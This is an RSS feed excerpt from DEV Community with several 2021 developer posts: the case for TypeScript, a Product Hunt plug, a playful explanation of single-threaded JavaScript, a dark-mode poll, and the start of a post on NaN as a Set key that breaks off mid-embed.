<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Reasons to use Typescript</title>
      <author>Sergiy</author>
      <pubDate>Sat, 05 Jun 2021 13:15:26 +0000</pubDate>
      <link>https://dev.to/sergchr/reasons-to-use-typescript-1ig6</link>
      <guid>https://dev.to/sergchr/reasons-to-use-typescript-1ig6</guid>
      <description>&lt;p&gt;Typescript is a superset of Javascript. It's Javascript with type definitions and the code will be checked when compiling.&lt;/p&gt;

&lt;p&gt;Why to adopt TS if ...&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#javascript-is-fast-to-prototype"&gt;
  &lt;/a&gt;
  Javascript is fast to prototype
&lt;/h2&gt;

&lt;p&gt;We can code fast with Javascript. The language is simple and allows us to do a lot of things. A prototyping time can be amazingly short. A downside of this is code readability. If we need to prototype something quickly to understand if the idea is viable, we skip thinking about architecture, writing documentation, tests. Eventually, we have a working piece. It has some bugs, but they can be fixed relatively fast. The piece is doing its intended job, we add more functionality to it, but some problems start to emerge.&lt;/p&gt;

&lt;p&gt;To add a simple functionality, it's hard to understand whether some service passes you an object with 20 fields, a string, or it may not pass anything at all. It's difficult to fathom API contracts between code pieces you wrote! By writing more console.log's you see the contracts and adjust the code to new requirements.&lt;br&gt;
After some time, your colleague asks a team's help to assist in debugging "what these objects are". Next month a manager asks why it takes so long to modify a tiny bit of the functionality. The company even hired 5 additional developers for the last week. In the next week, the CEO along with CTO decided to rewrite the product from scratch.&lt;/p&gt;

&lt;p&gt;Could the situation be different if the team adopted Typescript? Not really. But TS could help to eliminate bugs initially and with the next releases. Plus, it would take less time to modify existing code. Why? Doesn't TS add more time to write, because you should think about types, write them down? We'll get back to this question.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#typescript-eliminates-problems-when-you-write-the-code"&gt;
  &lt;/a&gt;
  Typescript eliminates problems when you write the code
&lt;/h2&gt;

&lt;p&gt;IDEs have great TS support, so they will highlight potential errors you encounter. But, what kind of errors? Imagine you construct an object, convert it to some other form, pass it to a chain of 5 functions and then send the result to UI. It's easy to follow the object properties when constructing it in the beginning. It's difficult to follow a contract further. The next function can remove necessary fields from the object, another one will add some new ones, etc. With Typescript, you code how the object should look like, what properties are required, what are optional, and this contract will be followed. Otherwise, you'll get compile errors(and errors highlights before that).&lt;/p&gt;

&lt;p&gt;Another situation: there is a function that should be returning a number, but returns undefined. The function is complicated and we can't exactly know where the problem occurs(i.e. why it can't handle 10).&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nx"&gt;calculateXfromNum&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;./otherService&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// there is a function from other service&lt;/span&gt;
&lt;span class="c1"&gt;// it calculates some number from other number&lt;/span&gt;
&lt;span class="c1"&gt;// this function should return number, at least we expect that&lt;/span&gt;
&lt;span class="c1"&gt;// judging by the code&lt;/span&gt;
&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;num&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;calculateXfromNum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// num is undefined&lt;/span&gt;

&lt;span class="c1"&gt;// this function expect a number&lt;/span&gt;
&lt;span class="nx"&gt;doStuffWithResult&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;num&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// error&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#it-improves-code-readability"&gt;
  &lt;/a&gt;
  It improves code readability
&lt;/h2&gt;

&lt;p&gt;Have you struggled with situations where you didn't know what to expect from functions, 3rd-party services responses? Like in the example above. Types allow you to see what other functions take as arguments and what they'll return. Have you seen the console.log debugging process? To understand what form an object has, people log it to the output a few times along the function execution.&lt;/p&gt;

&lt;p&gt;You could use debugger also, it may help more. But why make things so complicated? Isn't it enjoyable to know what this class method returns from the first glance at the code?&lt;/p&gt;

&lt;p&gt;The subsequent question you may derive from the reasons above may be:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;What about the time we spend on documenting types and writing more code? The coding won't be so fast then.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#it-accelerates-the-development-process"&gt;
  &lt;/a&gt;
  It accelerates the development process
&lt;/h2&gt;

&lt;p&gt;How is that possible?&lt;br&gt;
If you think you will document all the types when using TS, thus it slows you down, that's not the case. Typescript is smart enough to infer types from code. In cases where it can't do that, you need to indicate a type explicitly. For example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// n is number&lt;/span&gt;

&lt;span class="c1"&gt;// here, "num" can't be inferred, because you can pass anything here&lt;/span&gt;
&lt;span class="c1"&gt;// TS can't know that&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;fn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;num&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;num&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;// if you point that "num" is number, TS knows the returning type&lt;/span&gt;
&lt;span class="c1"&gt;// will be a number too&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;fn2&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;num&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;num&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;Still, even if Typescript can infer types in simple cases, a developer should write complex types, so how the development becomes faster?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;How much time do you think developers in mid/large-size JS projects spend on debugging to understand what an object will be returned by some function? I think a lot. We don't write code for machines, but humans. The code should be understandable. You take a glance and you get a basic idea of what's going on.&lt;/p&gt;

&lt;p&gt;Learning Typescript syntax takes a few minutes to start coding if you already understand Javascript. What you need to know is how to declare type/interface. Then, you need some time to get used to advanced cases.&lt;/p&gt;

&lt;p&gt;The additional development time will go to defining types, which isn't so time-consuming. At least, it takes much less time than:&lt;/p&gt;

&lt;p&gt;asking a colleague where to find documentation about a service;&lt;br&gt;
asking a colleague who wrote that;&lt;br&gt;
asking the person who wrote that to explain what the form of an object is;&lt;br&gt;
writing comments about object type after debugging it;&lt;br&gt;
rewriting the comments because you didn't expect other use cases;&lt;br&gt;
Save yourself and your team many human hours of reading and understanding the code.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#how-to-migrate-to-typescript"&gt;
  &lt;/a&gt;
  How to migrate to Typescript
&lt;/h2&gt;

&lt;p&gt;I'll provide points for you to decide is it worth adopting at all, and how simple the process is.&lt;/p&gt;
&lt;h3&gt;
  &lt;a href="#its-easy-to-learn"&gt;
  &lt;/a&gt;
  It's easy to learn
&lt;/h3&gt;

&lt;p&gt;Understand how to declare types/interfaces and you're good to go. Basically, it's:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Human&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;age&lt;/span&gt;&lt;span class="p"&gt;?:&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;me&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;Human&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Sergiy&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;While you write more code, you'll get to know many other things along the way.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#its-easy-to-start-right-away"&gt;
  &lt;/a&gt;
  It's easy to start right away
&lt;/h3&gt;

&lt;p&gt;If you have a Javascript project already, all it takes for you to start writing TS code is to have Typescript installed, maybe some tsconfig configuration, and to set the --allowJs flag, so you can mix TS with JS code. As you code more, you'll add more types, and maybe you convert all the codebase to TS. At least, you can TSify crucial parts of the code right now.&lt;/p&gt;

&lt;p&gt;However, you'll need to compile the project to Javascript. An additional build step in your workflow.&lt;/p&gt;

&lt;p&gt;If you're convinced to switch or migrate to Typescript, there are some thoughts to ponder about. As a person who leads a team, you should be responsible to explain to the developers why do you choose TS, what are pros and cons. Otherwise, programmers may think of it as a tool that slows them down. You may encounter situations when a developer write something like that:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kr"&gt;any&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="kr"&gt;any&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// ...&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;While it's a valid code, it doesn't add more readability. A developer may find using any is a good thing to save time. The idea the developers should understand is that if something is unknown, it's better to figure out the actual type and document it.&lt;/p&gt;

&lt;p&gt;Almost the same situation with wide types like object: the data may be an object with any properties, a function, an array. The more narrow type, the better.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#summary"&gt;
  &lt;/a&gt;
  Summary
&lt;/h2&gt;

&lt;p&gt;Use Typescript if you need better code readability, hence development speed up in the long run. It takes a little time to get started with TS if you know Javascript. You can integrate TS in your Javascript project without rewriting JS parts right away.&lt;/p&gt;

&lt;p&gt;Typescript is a tool that should be regarded as such and not as a thing that solves abstract problems like "improving the code".&lt;/p&gt;




&lt;p&gt;&lt;a href="https://twitter.com/sergchr"&gt;Follow me on Twitter&lt;/a&gt; and &lt;a href="https://metacognitive.me"&gt;see my other articles&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>beginners</category>
      <category>typescript</category>
      <category>programming</category>
    </item>
    <item>
      <title>Hooked in build-time DOM diffing and simplicity? Pls help!</title>
      <author>chris-czopp</author>
      <pubDate>Sat, 05 Jun 2021 12:51:31 +0000</pubDate>
      <link>https://dev.to/chrisczopp/hooked-in-build-time-dom-diffing-and-simplicity-pls-help-323i</link>
      <guid>https://dev.to/chrisczopp/hooked-in-build-time-dom-diffing-and-simplicity-pls-help-323i</guid>
      <description>&lt;p&gt;I just posted my project on &lt;a href="https://www.producthunt.com/posts/gluecodes-studio"&gt;Product Hunt&lt;/a&gt;. It's a front-end studio for those developers who are hooked in build-time DOM diffing and awesome automation. If you like it, upvote my product 🙏 as it's super important to get the early boost which will keep us higher on their listings so we're noticed.&lt;/p&gt;

&lt;p&gt;Here is the product: &lt;a href="https://www.producthunt.com/posts/gluecodes-studio"&gt;GlueCodes Studio&lt;/a&gt;&lt;/p&gt;

</description>
      <category>news</category>
      <category>startup</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Explain What Single-Threaded JavaScript Means Like You Are 5 Years Old</title>
      <author>Nick Bull</author>
      <pubDate>Sat, 05 Jun 2021 12:26:46 +0000</pubDate>
      <link>https://dev.to/nickbulljs/explain-what-single-threaded-javascript-means-like-you-are-5-years-old-1fhd</link>
      <guid>https://dev.to/nickbulljs/explain-what-single-threaded-javascript-means-like-you-are-5-years-old-1fhd</guid>
      <description>&lt;p&gt;You are 5. A couple of years ago you could barely walk and talk. And now you're going to learn the hardest concept in JavaScript – threads. Sounds cool? Let’s start.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#singlethreaded-javascript-our-super-special-kid"&gt;
  &lt;/a&gt;
  Single-Threaded Javascript. Our Super. Special. Kid.
&lt;/h2&gt;

&lt;p&gt;JavaScript is different from all other children. He is a special kid.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--jFx0GeKq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622888777539/lGQmfOJT8.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--jFx0GeKq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622888777539/lGQmfOJT8.png" alt="Slide 16_9 - 1.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;No, he can’t fly. &lt;strong&gt;He is single-threaded.&lt;/strong&gt; While other kids are multi-threaded.&lt;/p&gt;

&lt;p&gt;Nothing bad about it. It’s his choice. I even love it. But that's what makes it completely different in terms of how the code is running in JavaScript.&lt;/p&gt;

&lt;p&gt;When normal kids want to make a hot chocolate and watch a funny show on YouTube, they do it at the same time:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--YyoXRcjs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622894742046/Jjz6WY303.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YyoXRcjs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622894742046/Jjz6WY303.png" alt="Slide 16_9 - 12.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But when our special kid wants to do it, he does it one by one:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--rqQGbt7W--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622894753051/FtC1rmxC8.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--rqQGbt7W--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622894753051/FtC1rmxC8.png" alt="Slide 16_9 - 13.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The difference is that our kid always waits until some task is done and only &lt;em&gt;after&lt;/em&gt; that starts the next one. Other kids perform tasks simultaneously and don’t wait until some task is completed.&lt;/p&gt;

&lt;p&gt;The same way single-thread languages are different from multiple-thread languages. &lt;strong&gt;One performs only one task at a time. Others can perform them in parallel.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;But why single-thread languages, special kids, can’t be normal and perform tasks in parallel?&lt;/p&gt;

&lt;p&gt;It's all about how the threads work.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#threads-slides-dogs"&gt;
  &lt;/a&gt;
  Threads. Slides. Dogs.
&lt;/h2&gt;

&lt;p&gt;In programming, threads are essentially single processes that a program can use to perform tasks. Like a water slide where performing a task is the process of sliding down.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--UkYbMz40--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622891371422/yq74LpLj8.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--UkYbMz40--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622891371422/yq74LpLj8.png" alt="Slide 16_9 - 10.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Yes, it's a dog. It represents a task.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Your computer works that way that &lt;strong&gt;each thread can execute only one task at a time.&lt;/strong&gt; And everything else is blocked until an operation completes.&lt;/p&gt;

&lt;p&gt;When one dog slides down a water slide, the other dogs have to wait. They can't slide down. &lt;strong&gt;Only one dog in a water slide. Only one task at a time in a thread.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--2Oh6sE2n--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622891741804/g9od7eder.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--2Oh6sE2n--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622891741804/g9od7eder.png" alt="Slide 16_9 - 11.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Our special kid JavaScript is a single-threaded language. It has only one thread. That’s why it can perform only one task at a time.&lt;/p&gt;

&lt;p&gt;But other kids are different.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#thread-aquapark-our-child-has-grown-up"&gt;
  &lt;/a&gt;
  Thread. Aquapark. Our child has grown up.
&lt;/h2&gt;

&lt;p&gt;Imagine that our special kid grew up and decided to open an aquapark for dogs. But not a normal aquapark. He applied his &lt;em&gt;“single-threaded philosophy of life"&lt;/em&gt; to it.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--bRbSRPGC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622888813098/Rhk_gMHtd.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--bRbSRPGC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622888813098/Rhk_gMHtd.png" alt="Slide 16_9 - 4.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Because JavaScript is a single-threaded aquapark that only has one water slide, dogs can't go and have fun on the other slides. They have to stand in line and wait for each dog in front of them to finish riding.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--34EGngZ5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622888828932/1OYiC73rN.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--34EGngZ5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622888828932/1OYiC73rN.png" alt="Slide 16_9 - 5.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Looking at this, I can tell that our special kid JavaScript is going to be a total business fiasco. Can you imagine what will happen if some dog will slide down the water slide for 1 hour? Other dogs are waiting. Owners are angry. Dog Guards can't go home. Total disaster.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gRVhnRFO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622888839599/_OXihLePv.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gRVhnRFO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622888839599/_OXihLePv.png" alt="Slide 16_9 - 6.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Not every time we want to wait until some task is complete to move on to the next one. Sometimes we want to do them in parallel. Like other kids do. But JavaScript can't do it. He is a &lt;em&gt;special&lt;/em&gt; kid. He is single-threaded.&lt;/p&gt;

&lt;p&gt;And no matter how hard he tries to imitate multithreading behavior with setTimeout(..., 0) and web workers, he will still remain single-threaded. He will still remain our &lt;em&gt;special&lt;/em&gt; kid.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--wwjAZ22P--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622889044466/uuU_twIlR.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--wwjAZ22P--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1622889044466/uuU_twIlR.png" alt="Slide 16_9 - 9.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;PS: no dogs were harmed in the process of writing this article.&lt;/em&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#in-the-end"&gt;
  &lt;/a&gt;
  In the end...
&lt;/h2&gt;

&lt;p&gt;If you want to learn JavaScript, I have something interesting for you. A JavaScript course that fixes &lt;em&gt;one&lt;/em&gt; thing that 97% of other courses lack – &lt;strong&gt;a combination of modern and practical JavaScript theory with real-world practice.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Try to get it here:  &lt;a href="http://javascriptcoursethatworks.com/"&gt;javascriptcoursethatworks.com&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;And if you like this article you need to know that every Monday, I send a letter to 4,000+ Web Developers with 3 hand-picked articles from the tech world, 2 web development guides, and 1 best Tweet of the week&lt;/p&gt;

&lt;p&gt;&lt;em&gt;“Your newsletter is f&lt;/em&gt;&lt;em&gt;king awesome, really Nick. It gives me a great start to the week with a lot of insightful knowledge.”&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Join smart developers who get short and full of knowledge letters for free &lt;a href="https://nickbulljs.com/newsletter/"&gt;here&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>javascript</category>
    </item>
    <item>
      <title>Do you prefer light or dark mode?  If so, why?</title>
      <author>𝐋𝐄𝑽𝐈𝑨𝐓𝐇𝐀𝐍 Programming</author>
      <pubDate>Sat, 05 Jun 2021 12:11:10 +0000</pubDate>
      <link>https://dev.to/leviathanprogramming/do-you-prefer-light-or-dark-mode-if-so-why-3j0e</link>
      <guid>https://dev.to/leviathanprogramming/do-you-prefer-light-or-dark-mode-if-so-why-3j0e</guid>
      <description>&lt;p&gt;Some people like using light mode websites and some like dark ones.  I would like your opinion on which theme to use and why.&lt;/p&gt;

&lt;p&gt;I personally prefer to use dark mode websites.  Honestly, darkmode websites waste less power in your computer, they don't damage your eyes as fast, and they are just... nice.&lt;br&gt;
Also, I never keep my computer at full brightness.&lt;/p&gt;

&lt;p&gt;If you do prefer to use darkmode, you should use two nice Chrome Extensions.  Dark Reader and Midnight Lizard are the best ones so far.&lt;/p&gt;

&lt;p&gt;Someone once wrote a haiku about turning on a bright light at night and it feels like that to me when I switch from a dark website to a light one.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;It's midnight and I&lt;/em&gt; &lt;br&gt;
&lt;em&gt;Turn on the light ahhh ahhhh ahhhhhh&lt;/em&gt; &lt;br&gt;
&lt;em&gt;IT'S SO BRIGHT MY EYES&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Tell me what you prefer to use and why in the comments below&lt;br&gt;
⬇︎⬇︎⬇︎&lt;/p&gt;

</description>
      <category>discuss</category>
      <category>programming</category>
      <category>watercooler</category>
      <category>codequality</category>
    </item>
    <item>
      <title>NaN and Set Keys</title>
      <author>Nick Taylor (he/him)</author>
      <pubDate>Sat, 05 Jun 2021 12:08:27 +0000</pubDate>
      <link>https://dev.to/nickytonline/nan-and-set-keys-21n6</link>
      <guid>https://dev.to/nickytonline/nan-and-set-keys-21n6</guid>
      <description>&lt;p&gt;On Thursday, during my JavaScriptHours stream, we came across something interesting.&lt;/p&gt;

&lt;p&gt;In JavaScript, &lt;code&gt;NaN !== NaN&lt;/code&gt;. With a &lt;code&gt;Set&lt;/code&gt;, the values are unique. If you try to add the same value, there will always be one of it in the &lt;code&gt;Set&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;During the stream, I created a &lt;code&gt;Set&lt;/code&gt; and added &lt;code&gt;NaN&lt;/code&gt; to it twice. Some of the audience in the chat as well as myself were surprised and perplexed that the &lt;code&gt;Set&lt;/code&gt; contained one value after adding &lt;code&gt;NaN&lt;/code&gt; twice given that &lt;code&gt;NaN !== NaN&lt;/code&gt;.&lt;/p&gt;


&lt;blockquote class="ltag__twitter-tweet"&gt;
      &lt;div class="ltag__twitter-tweet__media"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--DnoiJi78--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/media/E2-RtuGXEAMWNLz.jpg" alt="unknown tweet media content"&gt;
      &lt;/div&gt;

  &lt;div class="ltag__twitter-tweet__main"&gt;
    &lt;div class="ltag__twitter-tweet__header"&gt;
      &lt;img class="ltag__twitter-tweet__profile-image" src="https://res.cloudinary.com/practicaldev/image/fetch/s--P11PQVAz--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://pbs.twimg.com/profile_images/1152392593042485249/M7M0YZ4j_normal.jpg" alt="Nick Taylor (he/him) profile image"&gt;
      &lt;div class="ltag__twitter-tweet__full-name"&gt;
        Nick Taylor (he/him)
      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__username"&gt;
        &lt;a class="mentioned-user" href="https://dev.to/nickytonline"&gt;@nickytonline&lt;/a&gt;

      &lt;/div&gt;
      &lt;div class="ltag__twitter-tweet__twitter-logo"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ir1kO05j--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/twitter-f95605061196010f91e64806688390eb1a4dbc9e913682e043eb8b1e06ca484f.svg" alt="twitter logo"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__body"&gt;
      NaN does not equal NaN in JavaScript. Why can you set a key to NaN in a Set multiple times, and it says it's unique?&lt;br&gt;&lt;br&gt;It stumped us on the stream.&lt;br&gt;&lt;br&gt;We talk about it in the stream at 44:37, &lt;a href="https://t.co/RZrtbw6dDA"&gt;twitch.tv/videos/1044463…&lt;/a&gt; &lt;a href="https://twitter.com/hashtag/javascript"&gt;#javascript&lt;/a&gt; &lt;a href="https://twitter.com/hashtag/JavaScriptHours"&gt;#JavaScriptHours&lt;/a&gt; 
    &lt;/div&gt;
    &lt;div class="ltag__twitter-tweet__date"&gt;
      17:05 PM - 03 Jun 2021
    &lt;/div&gt;


    &lt;div class="ltag__twitter-tweet__actions"&gt;
